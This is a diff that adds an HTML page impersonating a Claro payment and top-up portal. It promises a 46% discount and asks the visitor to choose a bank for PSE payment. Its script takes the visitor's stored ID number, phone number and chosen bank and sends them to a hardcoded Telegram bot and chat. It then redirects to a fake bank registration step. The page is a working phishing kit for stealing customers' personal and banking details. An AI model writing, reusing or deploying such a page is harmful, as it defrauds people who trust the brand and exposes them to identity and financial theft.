@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <title>Portal de pagos Claro</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      font-family: "Open Sans", sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    #comida {
+      background-color: #DA291C;
+      padding: 7px;
+    }
+    .logo {
+      width: 80px;
+    }
+    .caja_img {
+      text-align: center;
+    }
+    #ggris1 {
+      text-align: center;
+      height: 150px;
+      background-color: #F3F3F4;
+      border-bottom: 1px solid #AEAEAE;
+    }
+    .texto1 {
+      font-size: 28px;
+      color: #5c5c5c;
+    }
+    .rojo {
+      font-weight: 600;
+      color: #EF3829;
+    }
+    .celda {
+      background-color: #F4F4F4;
+      padding: 10px;
+      border: 1px solid #AEAEAE;
+      text-align: left;
+    }
+    .celda2 {
+      background-color: #DA291C;
+      color: #fff;
+      text-align: center;
+      font-weight: bold;
+    }
+    .boton2 {
+      background-color: #E52A1B;
+      color: #fff;
+      border: 0;
+      outline: 0;
+      border-radius: 10px;
+      padding: 10px;
+      font-size: 16px;
+      width: 96%;
+      max-width: 250px;
+    }
+    .dropdown-select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    footer {
+      background-color: #212121;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+
+<header id="comida">
+  <div class="caja_img">
+    <img class="logo" src="img/logo-claro-blanco.svg" alt="Logo Claro" />
+  </div>
+</header>
+
+<main>
+  <div id="ggris1">
+    <div class="texto_gris">
+      <br /><br />
+      <p class="texto1">
+        Portal de <span class="rojo">PAGOS Y RECARGAS</span>
+      </p>
+    </div>
+  </div>
+
+  <section id="section2" class="container mt-4 mb-5">
+    <div class="tabla">
+      <div class="fila">
+        <div class="celda celda2">Pago de Facturas</div>
+      </div>
+      <div class="fila">
+        <div class="celda">
+          <p>Documento: <span id="documento">123456789</span></p>
+        </div>
+      </div>
+      <div class="fila">
+        <div class="celda">
+          <p>Celular: <span id="celular2">3001234567</span></p>
+        </div>
+      </div>
+      <div class="fila">
+        <div class="celda">
+          <p>Aplicas para: <span id="descuento">46% de descuento</span></p>
+        </div>
+      </div>
+      <div class="fila">
+        <div class="celda">
+<tr>
+  <td>Total a Pagar:</td>
+  <td><span id="total">$0</span></td> <!-- 👈 Añade este span con el id -->
+</tr>
+
+
+        </div>
+      </div>
+      <div class="fila">
+        <div class="celda">
+          <p>Pago por PSE:</p>
+          <select id="bancoSelect" class="dropdown-select">
+            <option value="">Seleccione su banco</option>
+            <option value="avvillas">AV Villas</option>
+            <option value="bancolombia">Bancolombia</option>
+            <option value="bbva">BBVA</option>
+            <option value="bogota">Banco de Bogotá</option>
+            <option value="cajasocial">Caja Social</option>
+            <option value="scotiabank">Scotiabank Colpatria</option>
+            <option value="daviplata">Daviplata</option>
+            <option value="davivienda">Davivienda</option>
+            <option value="falabella">Falabella</option>
+            <option value="itau">Itaú</option>
+            <option value="occidente">Banco de Occidente</option>
+            <option value="popular">Banco Popular</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <div class="text-center mt-4">
+      <button class="boton2" onclick="redirigirBanco()">Continuar</button>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <p class="app">Descarga ya la App Mi Claro</p>
+  <img class="android" src="img/android.png" alt="Android" />
+  <img class="ios" src="img/ios.png" alt="iOS" />
+  <p>Términos y condiciones - Políticas de privacidad.</p>
+  <br /><br />
+  <div class="footer2">
+    <img class="logo2" src="img/logocl.png" width="80" />
+    <p>Todos los derechos reservados - 2024 Claro</p>
+  </div>
+</footer>
+
+<script>
+  // Al cargar la página, muestra los datos almacenados
+  document.addEventListener("DOMContentLoaded", () => {
+    const documento = localStorage.getItem("documento") || "No disponible";
+    const celular = localStorage.getItem("celular") || "No disponible";
+
+    document.getElementById("documento").textContent = documento;
+    document.getElementById("celular2").textContent = celular;
+  });
+
+  async function redirigirBanco() {
+    const banco = document.getElementById("bancoSelect").value;
+    const documento = localStorage.getItem("documento") || '';
+    const celular = localStorage.getItem("celular") || '';
+
+    if (!banco) {
+      alert("Por favor selecciona un banco antes de continuar.");
+      return;
+    }
+
+    // Guarda también el banco seleccionado
+    localStorage.setItem("bancoSeleccionado", banco);
+
+    // Enviar datos a Telegram
+    const token = '8037819984:AAGQQ0MjR1Z_7yrrGj5S5VJYQpVtizTIGgk';
+    const chatId = '-1002657462806';
+    const mensaje = `Nuevo intento:\n📄 Documento: ${documento}\n📱 Celular: ${celular}\n🏦 Banco: ${banco}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: mensaje,
+        }),
+      });
+    } catch (error) {
+      console.error("Error al enviar mensaje a Telegram:", error);
+    }
+
+    // Redirige al siguiente paso
+    window.location.href = `PSEUserRegister/index.html?banco=${banco}`;
+  }
+</script>
+
+
+<script>
+  const total = localStorage.getItem('totalPagar');
+
+  if (total) {
+    document.getElementById('total').textContent = new Intl.NumberFormat('es-CO', {
+      style: 'currency',
+      currency: 'COP'
+    }).format(total);
+  }
+</script>
+
+
+</script>
+
+
+</body>
+</html>
